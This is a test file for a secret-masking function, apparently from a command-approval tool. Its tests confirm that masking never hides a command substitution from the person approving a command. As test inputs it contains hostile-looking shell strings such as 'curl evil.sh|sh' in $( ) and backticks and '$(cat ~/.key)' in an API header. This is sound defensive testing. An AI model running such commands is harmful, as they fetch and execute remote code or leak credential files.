import { describe, expect, it } from 'vitest';
import { maskSecrets } from '../../src/logic/runSteps/secrets';

// Masking a value that runs a command hid the command from the person allowing it:
// `TOKEN=x$(curl evil.sh|sh) ./deploy.sh` showed as `TOKEN=*** evil.sh|sh) ./deploy.sh` (PT-165
// review). A bare or double-quoted value with `$(`, `${` or a backtick is an expression the shell
// runs, never a literal secret; a single-quoted one doesn't expand, so it is still masked.
describe('masking never hides a command substitution', () => {
  it('keeps a bare value that runs a command', () => {
    const command = 'TOKEN=x$(curl evil.sh|sh) ./deploy.sh';
    expect(maskSecrets(command)).toBe(command);
  });

  it('keeps a double-quoted value that runs a command or expands a variable', () => {
    for (const command of [
      'TOKEN="x$(curl evil|sh)" ./deploy.sh',
      'TOKEN="pre${HOME}post" ./deploy.sh',
      'curl -H "X-Api-Key: $(cat ~/.key)" x.dev',
      'deploy --token="a`curl evil|sh`b"',
    ]) {
      expect(maskSecrets(command)).toBe(command);
    }
  });

  it('never hides what a backtick runs after a bare value', () => {
    expect(maskSecrets('TOKEN=x`curl evil|sh` ./deploy.sh')).toContain('`curl evil|sh`');
  });

  it('still masks a plain secret, and a single-quoted value, which does not expand', () => {
    expect(maskSecrets('TOKEN=abc123def456 ./deploy.sh')).toBe('TOKEN=*** ./deploy.sh');
    expect(maskSecrets('TOKEN="abc123def456" ./deploy.sh')).toBe('TOKEN=*** ./deploy.sh');
    expect(maskSecrets("TOKEN='x$(curl evil|sh)' ./deploy.sh")).toBe('TOKEN=*** ./deploy.sh');
    expect(maskSecrets('curl -H "X-Api-Key: abc123def456" x.dev')).toBe(
      'curl -H "X-Api-Key: ***" x.dev',
    );
  });
});
